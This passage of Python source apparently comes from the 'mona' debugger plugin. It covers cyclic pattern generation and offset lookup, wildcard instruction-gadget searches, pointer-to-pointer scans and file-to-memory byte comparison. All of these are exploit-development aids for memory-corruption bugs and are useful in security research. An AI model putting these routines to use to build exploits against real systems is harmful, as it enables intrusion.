						if pointerfound == len(allfiles):
							dbg.log(" -> Pointer 0x%s found in %d files" % (toHex(refpointer),pointerfound))
							objcomparefile.write(outtofile,comparefile)
							comppointers=comppointers+1
							dbg.updateLog()
							if ptr_to_get > 0 and comppointers >= ptr_to_get:
								stopnow = True
						else:
							objcomparefilenot.write(thisLine.replace('\n','').replace('\r',''),comparefilenot)
							comppointers_not += 1
	else:
		# overlap search
		for thisLine in refcontent:
			if not stopnow:
				refpointer=""
				pointerfound=1  #pointer is in source file for sure
				#is this a pointer line ?
				refpointer,instr = splitToPtrInstr(thisLine)
				outtofile = "\n0. Range [0x"+toHex(refpointer) + " + 0x" + toHex(rangeval) + " = 0x" + toHex(refpointer + rangeval) + "] : " + thisLine.replace("\n","").replace("\r","")
				if refpointer != -1:
						rangestart = refpointer
						rangeend = refpointer+rangeval
						totalptr=totalptr+1
						filecnt=0  #0 is actually the second file
						#is this a pointer which meets the criteria ?
						ptrx = MnPointer(refpointer)
						if meetsCriteria(ptrx,criteria):
							while filecnt < len(allfiles)-1 :
								foundinfile=0
								foundline = ""
								for srcLine in targetfiles[filecnt]:
									refpointer2,instr2 = splitToPtrInstr(srcLine)
									if refpointer2 >= rangestart and refpointer2 <= rangeend:
										foundinfile=1
										rangestart = refpointer2
								if foundinfile == 1:
									outtofile += "\n" + str(filecnt+1)+". Pointer 0x" + toHex(rangestart) + " found in range. | " + instr2.replace("\n","").replace("\r","") + "(Refptr 0x" + toHex(refpointer)+" + 0x" + toHex(rangestart - refpointer)+" )"
								else:
									break	#no need to check other files if any
								pointerfound = pointerfound + foundinfile
								filecnt += 1
						#search done
						if pointerfound == len(allfiles):
							outtofile += "\nOverlap range : [0x" + toHex(rangestart) + " - 0x" + toHex(rangeend) + "] : 0x" + toHex(rangestart-refpointer)+" bytes from start pointer 0x" + toHex(refpointer) +" \n"
							dbg.log(" -> Pointer(s) in range [0x%s + 0x%s] found in %d files" % (toHex(refpointer),toHex(rangeval),pointerfound))
							objcomparefile.write(outtofile,comparefile)
							comppointers += 1
							dbg.updateLog()
							if ptr_to_get > 0 and comppointers >= ptr_to_get:
								stopnow = True
						else:
							objcomparefilenot.write(thisLine.replace('\n','').replace('\r',''),comparefilenot)
							comppointers_not += 1
	dbg.log("Total number of pointers queried : %d" % totalptr)
	dbg.log("Number of matching pointers found : %d - check filecompare.txt for more info" % comppointers)
	dbg.log("Number of non-matching pointers found : %d - check filecompare_not.txt for more info" % comppointers_not)

#------------------#
# Cyclic pattern	#
#------------------#	

def createPattern(size,args={}):
	"""
	Create a cyclic (metasploit) pattern of a given size
	
	Arguments:
	size - value indicating desired length of the pattern
	       if value is > 20280, the pattern will repeat itself until it reaches desired length
		   
	Return:
	string containing the cyclic pattern
	"""
	char1="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	char2="abcdefghijklmnopqrstuvwxyz"
	char3="0123456789"

	if "extended" in args:
		char3 += ",.;+=-_!&()#@({})[]%"	# ascii, 'filename' friendly
	
	if "c1" in args and args["c1"] != "":
		char1 = args["c1"]
	if "c2" in args and args["c2"] != "":
		char2 = args["c2"]
	if "c3" in args and args["c3"] != "":
		char3 = args["c3"]
			
	if "js" in args:
		js_output = True
	else:
		js_output = False

	if not silent:
		if not "extended" in args and size > 20280 and (len(char1) <= 26 or len(char2) <= 26 or len(char3) <= 10):
			msg = "** You have asked to create a pattern > 20280 bytes, but with the current settings\n"
			msg += "the pattern generator can't create a pattern of " + str(size) + " bytes. As a result,\n"
			msg += "the pattern will be repeated for " + str(size-20280)+" bytes until it reaches a length of " + str(size) + " bytes.\n"
			msg += "If you want a unique pattern larger than 20280 bytes, please either use the -extended option\n"
			msg += "or extend one of the 3 charsets using options -c1, -c2 and/or -c3 **\n"
			dbg.logLines(msg,highlight=1)
			
	
	pattern = []
	max = int(size)
	while len(pattern) < max:
		for ch1 in char1:
			for ch2 in char2:
				for ch3 in char3:
					if len(pattern) < max:
						pattern.append(ch1)

					if len(pattern) < max:
						pattern.append(ch2)

					if len(pattern) < max:
						pattern.append(ch3)

	pattern = "".join(pattern)
	if js_output:
		return str2js(pattern)
	return pattern

def findOffsetInPattern(searchpat,size=20280,args = {}):
	"""
	Check if a given searchpattern can be found in a cyclic pattern
	
	Arguments:
	searchpat : the ascii value or hexstr to search for
	
	Return:
	entries in the log window, indicating if the pattern was found and at what position
	"""
	mspattern=""


	searchpats = []
	modes = []
	modes.append("normal")
	modes.append("upper")
	modes.append("lower")
	extratext = ""

	patsize=int(size)
	
	if patsize == -1:
		size = 500000
		patsize = size
	
	global silent
	oldsilent=silent
	
	for mode in modes:
		silent=oldsilent		
		if mode == "normal":
			silent=True
			mspattern=createPattern(size,args)
			silent=oldsilent
			extratext = " "
		elif mode == "upper":
			silent=True
			mspattern=createPattern(size,args).upper()
			silent=oldsilent
			extratext = " (uppercase) "
		elif mode == "lower":
			silent=True
			mspattern=createPattern(size,args).lower()
			silent=oldsilent
			extratext = " (lowercase) "
		if len(searchpat)==3:
			#register ?
			searchpat = searchpat.upper()
			regs = dbg.getRegs()		
			if searchpat in regs:
				searchpat = "0x" + toHex(regs[searchpat])
		if len(searchpat)==4:
			ascipat=searchpat
			if not silent:
				dbg.log("Looking for %s in pattern of %d bytes" % (ascipat,patsize))
			if ascipat in mspattern:
				patpos = mspattern.find(ascipat)
				if not silent:
					dbg.log(" - Pattern %s found in cyclic pattern%sat position %d" % (ascipat,extratext,patpos),highlight=1)
			else:
				#reversed ?
				ascipat_r = ascipat[3]+ascipat[2]+ascipat[1]+ascipat[0]
				if ascipat_r in mspattern:
					patpos = mspattern.find(ascipat_r)
					if not silent:
						dbg.log(" - Pattern %s (%s reversed) found in cyclic pattern%sat position %d" % (ascipat_r,ascipat,extratext,patpos),highlight=1)			
				else:
					if not silent:
						dbg.log(" - Pattern %s not found in cyclic pattern%s" % (ascipat_r,extratext))
		if len(searchpat)==8:
				searchpat="0x"+searchpat
		if len(searchpat)==10:
				hexpat=searchpat
				ascipat3 = toAscii(hexpat[8]+hexpat[9])+toAscii(hexpat[6]+hexpat[7])+toAscii(hexpat[4]+hexpat[5])+toAscii(hexpat[2]+hexpat[3])
				if not silent:
					dbg.log("Looking for %s in pattern of %d bytes" % (ascipat3,patsize))
				if ascipat3 in mspattern:
					patpos = mspattern.find(ascipat3)
					if not silent:
						dbg.log(" - Pattern %s (%s) found in cyclic pattern%sat position %d" % (ascipat3,hexpat,extratext,patpos),highlight=1)
				else:
					#maybe it's reversed
					ascipat4=toAscii(hexpat[2]+hexpat[3])+toAscii(hexpat[4]+hexpat[5])+toAscii(hexpat[6]+hexpat[7])+toAscii(hexpat[8]+hexpat[9])
					if not silent:
						dbg.log("Looking for %s in pattern of %d bytes" % (ascipat4,patsize))
					if ascipat4 in mspattern:
						patpos = mspattern.find(ascipat4)
						if not silent:
							dbg.log(" - Pattern %s (%s reversed) found in cyclic pattern%sat position %d" % (ascipat4,hexpat,extratext,patpos),highlight=1)
					else:
						if not silent:
							dbg.log(" - Pattern %s not found in cyclic pattern%s " % (ascipat4,extratext))

							
def findPatternWild(modulecriteria,criteria,pattern,base,top):
	"""
	Performs a search for instructions, accepting wildcards
	
	Arguments :
	modulecriteria - dictionary with criteria modules need to comply with.
	criteria - dictionary with criteria the pointers need to comply with.
	pattern - the pattern to search for.
	base - the base address in memory the search should start at
	top - the top address in memory the search should not go beyond	
	"""
	
	global silent	
	
	rangestosearch = []
	tmpsearch = []
	
	allpointers = {}
	results = {}
	
	mindistance = 4
	maxdistance = 40
	
	if "mindistance" in criteria:
		mindistance = criteria["mindistance"]
	if "maxdistance" in criteria:
		maxdistance = criteria["maxdistance"]
	
	maxdepth = 8
	
	preventbreak = True
	
	if "all" in criteria:
		preventbreak = False
	
	if "depth" in criteria:
		maxdepth = criteria["depth"]
	
	if not silent:
		dbg.log("[+] Searching for matches up to %d instructions deep" % maxdepth)
	
	if len(modulecriteria) > 0:
		modulestosearch = getModulesToQuery(modulecriteria)
		# convert modules to ranges
		for modulename in modulestosearch:
			objmod = MnModule(modulename)
			mBase = objmod.moduleBase
			mTop = objmod.moduleTop
			if mBase < base and base < mTop:
				mBase = base
			if mTop > top:
				mTop = top
			if mBase >= base and mBase < top:
				if not [mBase,mTop] in rangestosearch:
					rangestosearch.append([mBase,mTop])
		# if no modules were specified, then also add  the other ranges (outside modules)
		if not "modules" in modulecriteria:
			outside = getRangesOutsideModules()
			for range in outside:
				mBase = range[0]
				mTop = range[1]
				if mBase < base and base < mTop:
					mBase = base
				if mTop > top:
					mTop = top
				if mBase >= base and mBase < top:
					if not [mBase,mTop] in rangestosearch:
						rangestosearch.append([mBase,mTop])
	else:
		rangestosearch.append([base,top])
	
	pattern = pattern.replace("'","").replace('"',"")
	
	# break apart the instructions
	# search for the first instruction(s)
	allinstructions = pattern.split("#")
	instructionparts = []
	instrfound = False
	for instruction in allinstructions:
		instruction = instruction.strip().lower()
		if instrfound and instruction != "":
			instructionparts.append(instruction)
		else:
			if instruction != "*" and instruction != "":
				instructionparts.append(instruction)
				instrfound = True
				
	# remove wildcards placed at the end
	for i in rrange(len(instructionparts)):
		if instructionparts[i] == "*":
			instructionparts.pop(i)
		else:
			break

	# glue simple instructions together if possible
	# reset array
	allinstructions = []
	stopnow = False
	mergeinstructions = []
	mergestopped = False
	mergetxt = ""
	for instr in instructionparts:
		if instr.find("*") == -1 and instr.find("r32") == -1 and not mergestopped:
			mergetxt += instr + "\n"
		else:
			allinstructions.append(instr)
			mergestopped = True
	mergetxt = mergetxt.strip("\n")

	searchPattern = []
	remaining = allinstructions

	if mergetxt != "":
		searchPattern.append(mergetxt)
	else:
		# at this point, we're sure the first instruction has some kind of r32 and/or offset variable
		# get all of the combinations for this one
		# and use them as searchPattern
		cnt = 0
		stopped = False		
		for instr in allinstructions:
			if instr != "*" and (instr.find("r32") > -1 or instr.find("*") > -1) and not stopped:
				if instr.find("r32") > -1:
					for reg in dbglib.Registers32BitsOrder:
						thisinstr = instr.replace("r32",reg.lower())
						if instr.find("*") > -1:
							# contains a wildcard offset
							startdist = mindistance
							while startdist < maxdistance:
								operator = ""
								if startdist < 0:
									operator = "-"
								replacewith = operator + "0x%02x" % startdist
								thisinstr2 = thisinstr.replace("*",replacewith)
								searchPattern.append(thisinstr2)
								startdist += 1
						else:
							searchPattern.append(thisinstr)
				else:
					# no r32
					if instr.find("*") > -1:
						# contains a wildcard offset
						startdist = mindistance
						while startdist < maxdistance:
							operator = ""
							if startdist < 0:
								operator = "-"
							replacewith = operator + "0x%02x" % startdist
							thisinstr2 = instr.replace("*",replacewith)
							searchPattern.append(thisinstr2)
							startdist += 1
					else:
						searchPattern.append(instr)
				remaining.pop(cnt)
				stopped = True
			cnt += 1
		
	# search for all these beginnings
	if len(searchPattern) > 0:
		if not silent:
			dbg.log("[+] Started search (%d start patterns)" % len(searchPattern))
		dbg.updateLog()
		for ranges in rangestosearch:
			mBase = ranges[0]
			mTop = ranges[1]
			if not silent:
				dbg.log("[+] Searching startpattern between 0x%s and 0x%s" % (toHex(mBase),toHex(mTop)))
			dbg.updateLog()
			oldsilent=silent
			silent=True
			pointers = searchInRange(searchPattern,mBase,mTop,criteria)
			silent=oldsilent
			allpointers = mergeOpcodes(allpointers,pointers)	
	
	# for each of the findings, see if it contains the other instructions too
	# disassemble forward up to 'maxdepth' instructions

	for ptrtypes in allpointers:
		for ptrs in allpointers[ptrtypes]:
			thisline = ""
			try:
				for depth in xrange(maxdepth):
					tinstr = dbg.disasmForward(ptrs, depth).getDisasm().lower() + "\n"
					if tinstr != "???":
						thisline += tinstr
					else:
						thisline = ""
						break	
			except:
				continue
			allfound = True
			thisline = thisline.strip("\n")
			
			if thisline != "":
				parts = thisline.split("\n")
				maxparts = len(parts)-1
				partcnt = 1
				searchfor = ""
				remcnt = 0
				lastpos = 0
				remmax = len(remaining)
				while remcnt < remmax:
				
					searchfor = remaining[remcnt]
						
					searchlist = []
					if searchfor == "*":
						while searchfor == "*" and remcnt < remmax:
							searchfor = remaining[remcnt+1]
							rangemin = partcnt
							rangemax = maxparts
							remcnt += 1

					else:
						rangemin = partcnt
						rangemax = partcnt
						
					if searchfor.find("r32") > -1:
						for reg in dbglib.Registers32BitsOrder:
							searchlist.append(searchfor.replace("r32",reg.lower()))	
					else:
						searchlist.append(searchfor)
						
					partfound = False
					
					while rangemin <= rangemax and not partfound and rangemax <= maxparts:
						for searchfor in searchlist:
							if parts[rangemin].find(searchfor) > -1:						
								partfound = True
								lastpos = rangemin
								partcnt = lastpos # set counter to current position
								break
						if not partfound and preventbreak:
							#check if current instruction would break chain
							if wouldBreakChain(parts[rangemin]):
								# bail out
								partfound = False
								break
						rangemin += 1
						
					remcnt += 1
					partcnt += 1					
					
					if not partfound:
						allfound = False
						break

					
			if allfound:
				theline = " # ".join(parts[:lastpos+1])
				if theline != "":
					if not theline in results:
						results[theline] = [ptrs]
					else:
						results[theline] += [ptrs]
	return results

	
def wouldBreakChain(instruction):
	"""
	Checks if the given instruction would potentially break the instruction chain
	Argument :
	instruction:  the instruction to check
	
	Returns :
	boolean 
	"""
	goodinstruction = isGoodGadgetInstr(instruction)
	if goodinstruction:
		return False
	return True


def findPattern(modulecriteria,criteria,pattern,type,base,top,consecutive=False,rangep2p=0,level=0,poffset=0,poffsetlevel=0):
	"""
	Performs a find in memory for a given pattern
	
	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	criteria - dictionary with criteria the pointers need to comply with.
				One of the criteria can be "p2p", indicating that the search should look for
				pointers to pointers to the pattern
	pattern - the pattern to search for.
	type - the type of the pattern, can be 'asc', 'bin', 'ptr', 'instr' or 'file'
		If no type is specified, the routine will try to 'guess' the types
		when type is set to file, it won't actually search in memory for pattern, but it will
		read all pointers from that file and search for pointers to those pointers
		(so basically, type 'file' is only useful in combination with -p2p)
	base - the base address in memory the search should start at
	top - the top address in memory the search should not go beyond
	consecutive - Boolean, indicating if consecutive pointers should be skipped
	rangep2p - if not set to 0, the pointer to pointer search will also look rangep2p bytes back for each pointer,
			thus allowing you to find close pointer to pointers
	poffset - only used when doing p2p, will add offset to found pointer address before looking to ptr to ptr
	poffsetlevel - apply the offset at this level of the chain
	level - number of levels deep to look for ptr to ptr. level 0 is default, which means search for pointer to searchpattern
	
	Return:
	all pointers (or pointers to pointers) to the given search pattern in memory
	"""
	rangestosearch = []
	tmpsearch = []
	p2prangestosearch = []
	global silent	
	if len(modulecriteria) > 0:
		modulestosearch = getModulesToQuery(modulecriteria)
		# convert modules to ranges
		for modulename in modulestosearch:
			objmod = MnModule(modulename)
			mBase = objmod.moduleBase
			mTop = objmod.moduleTop
			if mBase < base and base < mTop:
				mBase = base
			if mTop > top:
				mTop = top
			if mBase >= base and mBase < top:
				if not [mBase,mTop] in rangestosearch:
					rangestosearch.append([mBase,mTop])
		# if no modules were specified, then also add  the other ranges (outside modules)
		if not "modules" in modulecriteria:
			outside = getRangesOutsideModules()
			for range in outside:
				mBase = range[0]
				mTop = range[1]
				if mBase < base and base < mTop:
					mBase = base
				if mTop > top:
					mTop = top
				if mBase >= base and mBase < top:
					if not [mBase,mTop] in rangestosearch:
						rangestosearch.append([mBase,mTop])
	else:
		rangestosearch.append([base,top])
	
	tmpsearch.append([0,TOP_USERLAND])
	
	allpointers = {}
	originalPattern = pattern
	
	# guess the type if it is not specified
	if type == "":
		if len(pattern) > 2 and pattern[0:2].lower() == "0x":
			type = "ptr"
		elif "\\x" in pattern:
			type = "bin"
		else:
			type = "asc"
			
	if "unic" in criteria and type == "asc":
		type = "bin"
		binpat = ""
		pattern = pattern.replace('"',"")
		for thischar in pattern:
			binpat += "\\x" + str(toHexByte(ord(thischar))) + "\\x00"
		pattern = binpat
		originalPattern += " (unicode)"
		if not silent:
			dbg.log("    - Expanded ascii pattern to unicode, switched search mode to bin")

	bytes = ""
	patternfilename = ""
	split1 = re.compile(' ')		
	split2 = re.compile(':')
	split3 = re.compile("\*")		
	
	if not silent:
		dbg.log("    - Treating search pattern as %s" % type)
		
	if type == "ptr":
		pattern = pattern.replace("0x","")
		value = int(pattern,16)
		bytes = struct.pack('<I',value)
	elif type == "bin":
		if len(pattern) % 2 != 0:
			dbg.log("Invalid hex pattern", highlight=1)
			return
		bytes = hex2bin(pattern)
	elif type == "asc":
		if pattern.startswith('"') and pattern.endswith('"'):
			pattern = pattern.replace('"',"")
		elif pattern.startswith("'") and pattern.endswith("'"):
			pattern = pattern.replace("'","")
		bytes = pattern
	elif type == "instr":
		pattern = pattern.replace("'","").replace('"',"")
		silent = True
		bytes = hex2bin(assemble(pattern,""))
		silent = False
		if bytes == "":
			dbg.log("Invalid instruction - could not assemble",highlight=1)
			return
	elif type == "file":
		patternfilename = pattern.replace("'","").replace('"',"")
		dbg.log("    - Search patterns = all pointers in file %s" % patternfilename)
		dbg.log("      Extracting pointers...")
		FILE=open(patternfilename,"r")
		contents = FILE.readlines()
		FILE.close()
		extracted = 0	
		for thisLine in contents:
			if thisLine.lower().startswith("0x"):
				lineparts=split1.split(thisLine)
				thispointer = lineparts[0]
				#get type  = from : to *
				if len(lineparts) > 1:
					subparts = split2.split(thisLine)
					if len(subparts) > 1:
						if subparts[1] != "":
							subsubparts = split3.split(subparts[1])
							if not subsubparts[0] in allpointers:
								allpointers[subsubparts[0]] = [hexStrToInt(thispointer)]
							else:
								allpointers[subsubparts[0]] += [hexStrToInt(thispointer)]
							extracted += 1
		dbg.log("      %d pointers extracted." % extracted)							
	dbg.updateLog()
	
	fakeptrcriteria = {}
	
	fakeptrcriteria["accesslevel"] = "*"
	
	if "p2p" in criteria or level > 0:
		#save range for later, search in all of userland for now
		p2prangestosearch = rangestosearch
		rangestosearch = tmpsearch
	
	if type != "file":
		for ranges in rangestosearch:
			mBase = ranges[0]
			mTop = ranges[1]
			if not silent:
				dbg.log("[+] Searching from 0x%s to 0x%s" % (toHex(mBase),toHex(mTop)))
			dbg.updateLog()
			searchPattern = []
			searchPattern.append([originalPattern, bytes])
			oldsilent=silent
			silent=True
			pointers = searchInRange(searchPattern,mBase,mTop,criteria)
			silent=oldsilent
			allpointers = mergeOpcodes(allpointers,pointers)
	
	if type == "file" and level == 0:
		level = 1
		
	if consecutive:
		# get all pointers and sort them
		rawptr = {}
		for ptrtype in allpointers:
			for ptr in allpointers[ptrtype]:
				if not ptr in rawptr:
					rawptr[ptr]=ptrtype
		if not silent:
			dbg.log("[+] Number of pointers to process : %d" % len(rawptr))
		sortedptr = rawptr.items()
		sortedptr.sort(key = itemgetter(0))
		#skip consecutive ones and increment size
		consec_delta = len(bytes)
		previousptr = 0
		savedptr = 0
		consec_size = 0
		allpointers = {}
		for ptr,ptrinfo in sortedptr:
			if previousptr == 0:
				previousptr = ptr
				savedptr = ptr
			if previousptr != ptr:
				if ptr <= (previousptr + consec_delta):
					previousptr = ptr
				else:
					key = ptrinfo + " ("+ str(previousptr+consec_delta-savedptr) + ")"
					if not key in allpointers:
						allpointers[key] = [savedptr]
					else:
						allpointers[key] += [savedptr]
					previousptr = ptr
					savedptr = ptr

	#recursive search ? 
	if len(allpointers) > 0:
		remainingpointers = allpointers
		if level > 0:
			thislevel = 1
			while thislevel <= level:
				if not silent:
					pcnt = 0
					for ptype,ptrs in remainingpointers.iteritems():
						for ptr in ptrs:					
							pcnt += 1
					dbg.log("[+] %d remaining types found at this level, total of %d pointers" % (len(remainingpointers),pcnt))				
				dbg.log("[+] Looking for pointers to pointers, level %d..." % thislevel)
				if	thislevel == poffsetlevel:
					dbg.log("    Applying offset %d to pointers..." % poffset)
				dbg.updateLog()
				searchPattern = []
				foundpointers = {}
				for ptype,ptrs in remainingpointers.iteritems():
					for ptr in ptrs:
						cnt = 0
						if thislevel == poffsetlevel:
							ptr = ptr + poffset
						while cnt <= rangep2p:
							bytes = struct.pack('<I',ptr-cnt)
							if type == "file":
								originalPattern = ptype
							if cnt == 0:
								searchPattern.append(["ptr to 0x" + toHex(ptr) +" (-> ptr to " + originalPattern + ") ** ", bytes])
							else:
								searchPattern.append(["ptr to 0x" + toHex(ptr-cnt) +" (-> close ptr to " + originalPattern + ") ** ", bytes])	
							cnt += 1
							#only apply rangep2p in level 1
							if thislevel == 1:
								rangep2p = 0
				remainingpointers = {}
				for ranges in p2prangestosearch:
					mBase = ranges[0]
					mTop = ranges[1]
					if not silent:
						dbg.log("[+] Searching from 0x%s to 0x%s" % (toHex(mBase),toHex(mTop)))
					dbg.updateLog()
					oldsilent = silent
					silent=True
					pointers = searchInRange(searchPattern,mBase,mTop,fakeptrcriteria)
					silent=oldsilent
					for ptrtype in pointers:
						if not ptrtype in remainingpointers:
							remainingpointers[ptrtype] = pointers[ptrtype]
				thislevel += 1
				if len(remainingpointers) == 0:
					if not silent:
						dbg.log("[+] No more pointers left, giving up...", highlight=1)
						break
		allpointers = remainingpointers

	return allpointers
		

def compareFileWithMemory(filename,startpos,skipmodules=False):
	dbg.log("[+] Reading file %s..." % filename)
	srcdata_normal=[]
	srcdata_unicode=[]
	tagresults=[]
	criteria = {}
	criteria["accesslevel"] = "*"
	try:
		srcfile = open(filename,"rb")
		content = srcfile.readlines()
		srcfile.close()
		for eachLine in content:
			srcdata_normal += eachLine
		for eachByte in srcdata_normal:
			eachByte+=struct.pack('B', 0)
			srcdata_unicode += eachByte
		dbg.log("    Read %d bytes from file" % len(srcdata_normal))
	except:
		dbg.log("Error while reading file %s" % filename, highlight=1)
		return
	# loop normal and unicode
	comparetable=dbg.createTable('mona Memory comparison results',['Address','Status','Type','Location'])	
	modes = ["normal", "unicode"]
	objlogfile = MnLog("compare.txt")
	logfile = objlogfile.reset()
	for mode in modes:
		if mode == "normal":
			srcdata = srcdata_normal
		if mode == "unicode":
			srcdata = srcdata_unicode
		maxcnt = len(srcdata)
		if maxcnt < 8:
			dbg.log("Error - file does not contain enough bytes (min 8 bytes needed)",highlight=1)
			return
		locations = []
		if startpos == 0:
			dbg.log("[+] Locating all copies in memory (%s)" % mode)
			btcnt = 0
			cnt = 0
			linecount = 0
			hexstr = ""
			hexbytes = ""
			for eachByte in srcdata:
				if cnt < 8:
					hexbytes += eachByte
					if len((hex(ord(srcdata[cnt]))).replace('0x',''))==1:
						hexchar=hex(ord(srcdata[cnt])).replace('0x', '\\x0')
					else:
						hexchar = hex(ord(srcdata[cnt])).replace('0x', '\\x')
					hexstr += hexchar					
				cnt += 1
			dbg.log("    - searching for "+hexstr)
			global silent
			silent = True
			results = findPattern({},criteria,hexstr,"bin",0,TOP_USERLAND,False)

			for type in results:
				for ptr in results[type]:
					ptrinfo = MnPointer(ptr).memLocation()
					if not skipmodules or (skipmodules and (ptrinfo in ["Heap","Stack","??"])):
						locations.append(ptr)
		else:
			startpos_fixed = hexStrToInt(startpos)
			locations.append(startpos_fixed)
		if len(locations) > 0:
			dbg.log("    - Comparing %d locations" % len(locations))
			dbg.log(" Comparing bytes from file with memory :")
			for location in locations:
				memcompare(location,srcdata,comparetable,mode, smart=(mode == 'normal'))
		silent = False
	return

def memoized(func):
	''' A function decorator to make a function cache it's return values.
	If a function returns a generator, it's transformed into a list and
	cached that way. '''
	cache = {}
	def wrapper(*args):
		if args in cache:
			return cache[args]
		import time; start = time.time()
		val = func(*args)
		if isinstance(val, types.GeneratorType):
			val = list(val)
		cache[args] = val
		return val
	wrapper.__doc__ = func.__doc__
	wrapper.func_name = '%s_memoized' % func.func_name
	return wrapper

class MemoryComparator(object):
	''' Solve the memory comparison problem with a special dynamic programming
	algorithm similar to that for the LCS problem '''

	Chunk = namedtuple('Chunk', 'unmodified i j dx dy xchunk ychunk')

	move_to_gradient = {
			0: (0, 0),
			1: (0, 1),
			2: (1, 1),
			3: (2, 1),
			}

	def __init__(self, x, y):
		self.x, self.y = x, y

	@memoized
	def get_last_unmodified_chunk(self):
		''' Returns the index of the last chunk of size > 1 that is unmodified '''
		return max(i for i, c in enumerate(self.get_chunks())
		           if c.unmodified and c.dx > 1)

	@memoized
	def get_grid(self):
		''' Builds a 2-d suffix grid for our DP algorithm. '''
		x = self.x
		y = self.y[:len(x)*2]
		width, height  = len(x), len(y)
		values = [[0] * (width + 1) for j in range(height + 1)]
		moves  = [[0] * (width + 1) for j in range(height + 1)]
		equal  = [[x[i] == y[j] for i in range(width)] for j in range(height)]
		equal.append([False] * width)

		for j, i in itertools.product(rrange(height + 1), rrange(width + 1)):
			value = values[j][i]
			if i >= 1 and j >= 1:
				if equal[j-1][i-1]:
					values[j-1][i-1] = value + 1
					moves[j-1][i-1] = 2
				elif value > values[j][i-1]:
					values[j-1][i-1] = value
					moves[j-1][i-1] = 2
			if i >= 1 and not equal[j][i-1] and value - 2 > values[j][i-1]:
				values[j][i-1] = value - 2
				moves[j][i-1] = 1
			if i >= 1 and j >= 2 and not equal[j-2][i-1] and value - 1 > values[j-2][i-1]:
				values[j-2][i-1] = value - 1
				moves[j-2][i-1] = 3
		return (values, moves)

	@memoized
	def get_blocks(self):
		'''
		Compares two binary strings under the assumption that y is the result of
		applying the following transformations onto x:

		 * change single bytes in x (likely)
		 * expand single bytes in x to two bytes (less likely)
		 * drop single bytes in x (even less likely)

		Returns a generator that yields elements of the form (unmodified, xdiff, ydiff),
		where each item represents a binary chunk with "unmodified" denoting whether the
		chunk is the same in both strings, "xdiff" denoting the size of the chunk in x
		and "ydiff" denoting the size of the chunk in y.

		Example:
		>>> x = "abcdefghijklm"
		>>> y = "mmmcdefgHIJZklm"
		>>> list(MemoryComparator(x, y).get_blocks())
		[(False, 2, 3), (True, 5, 5),
		 (False, 3, 4), (True, 3, 3)]
		'''
		x, y = self.x, self.y
		_, moves = self.get_grid()

		# walk the grid
		path = []
		i, j = 0, 0
		while True:
			dy, dx = self.move_to_gradient[moves[j][i]]
			if dy == dx == 0: break
			path.append((dy == 1 and x[i] == y[j], dy, dx))
			j, i = j + dy, i + dx

		for i, j in zip(range(i, len(x)), itertools.count(j)):
			if j < len(y): path.append((x[i] == y[j], 1, 1))
			else:          path.append((False,        0, 1))

		i = j = 0
		for unmodified, subpath in itertools.groupby(path, itemgetter(0)):
			ydiffs = map(itemgetter(1), subpath)
			dx, dy = len(ydiffs), sum(ydiffs)
			yield unmodified, dx, dy
			i += dx
			j += dy

	@memoized
	def get_chunks(self):
		i = j = 0
		for unmodified, dx, dy in self.get_blocks():
			yield self.Chunk(unmodified, i, j, dx, dy, self.x[i:i+dx], self.y[j:j+dy])
			i += dx
			j += dy

	@memoized
	def guess_mapping(self):
		''' Tries to guess how the bytes in x have been mapped to substrings in y by
		applying nasty heuristics.

		Examples:
		>>> list(MemoryComparator("abcdefghijklm", "mmmcdefgHIJZklm").guess_mapping())
		[('m', 'm'), ('m',), ('c',), ('d',), ('e',), ('f',), ('g',), ('H', 'I'), ('J',),
		 ('Z',), ('k',), ('l',), ('m',)]
		>>> list(MemoryComparator("abcdefgcbadefg", "ABBCdefgCBBAdefg").guess_mapping())
		[('A',), ('B', 'B'), ('C',), ('d',), ('e',), ('f',), ('g',), ('C',), ('B', 'B'),
		 ('A',), ('d',), ('e',), ('f',), ('g',)]
		'''
		x, y = self.x, self.y

		mappings_by_byte = defaultdict(lambda: defaultdict(int))
		for c in self.get_chunks():
			dx, dy = c.dx, c.dy
			# heuristics to detect expansions
			if dx < dy and dy - dx <= 3 and dy <= 5:
				for i, b in enumerate(c.xchunk):
					slices = set()
					for start in range(i, min(2*i + 1, dy)):
						for size in range(1, min(dy - start + 1, 3)):
							slc = tuple(c.ychunk[start:start+size])
							if slc in slices: continue
							mappings_by_byte[b][slc] += 1
							slices.add(slc)

		for b, values in mappings_by_byte.iteritems():
			mappings_by_byte[b] = sorted(values.items(),
			                             key=lambda (value, count): (-count, -len(value)))

		for c in self.get_chunks():
			dx, dy, xchunk, ychunk = c.dx, c.dy, c.xchunk, c.ychunk
			if dx < dy:  # expansion
				# try to apply heuristics for small chunks
				if dx <= 10:
					res = []
					for b in xchunk:
						if dx == dy or dy >= 2*dx: break
						for value, count in mappings_by_byte[b]:
							if tuple(ychunk[:len(value)]) != value: continue
							res.append(value)
							ychunk = ychunk[len(value):]
							dy -= len(value)
							break
						else:
							yield (ychunk[0],)
							ychunk = ychunk[1:]
							dy -= 1
						dx -= 1
					for c in res: yield c

				# ... or do it the stupid way. If n bytes were changed to m, simply do
				# as much drops/expansions as necessary at the beginning and than
				# yield the rest of the y chunk as single-byte modifications
				for k in range(dy - dx): yield tuple(ychunk[2*k:2*k+2])
				ychunk = ychunk[2*(dy - dx):]
			elif dx > dy:
				for _ in range(dx - dy): yield ()

			for b in ychunk: yield (b,)

def read_memory(dbg, location, max_size):
	''' read the maximum amount of memory from the given address '''
	for i in rrange(max_size + 1, 0):
		mem = dbg.readMemory(location, i)
		if len(mem) == i:
			return mem
	# we should never get here, i == 0 should always fulfill the above condition
	assert False

def shorten_bytes(bytes, size=8):
	if len(bytes) <= size: return bin2hex(bytes)
	return '%02x ... %02x' % (ord(bytes[0]), ord(bytes[-1]))

def draw_byte_table(mapping, log, columns=16):
	hrspace = 3 * columns - 1
	hr = '-'*hrspace
	log('    ,' + hr + '.')
	log('    |' + ' File'.ljust(hrspace) + '|')
	log('    |' + hr + '|')
	for i, chunk in enumerate(extract_chunks(mapping, columns)):
		chunk = list(chunk)  # save generator result in a list
		src, mapped = zip(*chunk)
		values = []
		for left, right in zip(src, mapped):
			if   left == right:   values.append('')             # byte matches original
			elif len(right) == 0: values.append('-1')           # byte dropped
			elif len(right) == 2: values.append('+1')           # byte expanded
			else:                 values.append(bin2hex(right)) # byte modified
		line1 = '%3x' % (i * columns) + ' |' + bin2hex(src)
		line2 = '    |' + ' '.join(sym.ljust(2) for sym in values)

		# highlight lines if a modification was detected - removed, looks bad in WinDBG
